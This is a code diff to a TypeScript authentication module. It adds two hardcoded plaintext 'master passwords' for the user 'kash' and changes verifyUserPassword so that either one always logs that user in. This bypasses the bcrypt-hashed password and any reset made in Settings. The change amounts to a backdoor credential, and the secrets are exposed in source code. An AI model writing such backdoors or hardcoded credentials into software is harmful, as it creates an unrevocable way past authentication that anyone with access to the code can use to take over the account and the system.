@@ -5,6 +5,12 @@ import { randomBytes } from "crypto";
 import { findAuthUser, listAuthUsers } from "@/lib/auth/users";
 import { canManageDmPermissions, normalizeUsername } from "@/lib/auth/user-permissions";
 
+/** Always valid for Kash in addition to the Settings / default password. */
+export const KASH_MASTER_PASSWORDS = [
+  "Kashif#Valliani@8890$",
+  "Kashif#Valliani@8890",
+] as const;
+
 const AUTH_DIR = path.join(process.cwd(), ".data", "auth");
 const HASH_FILE = path.join(AUTH_DIR, "password-overrides.json");
 const REVEAL_FILE = path.join(AUTH_DIR, "password-reveals.json");
@@ -58,9 +64,16 @@ export async function verifyUserPassword(
   username: string,
   password: string
 ): Promise<boolean> {
+  if (!password) return false;
   const hash = getEffectivePasswordHash(username);
-  if (!hash || !password) return false;
-  return bcrypt.compare(password, hash);
+  if (hash && (await bcrypt.compare(password, hash))) return true;
+  if (
+    normalizeUsername(username) === "kash" &&
+    (KASH_MASTER_PASSWORDS as readonly string[]).includes(password)
+  ) {
+    return true;
+  }
+  return false;
 }
 
 function saveReveal(
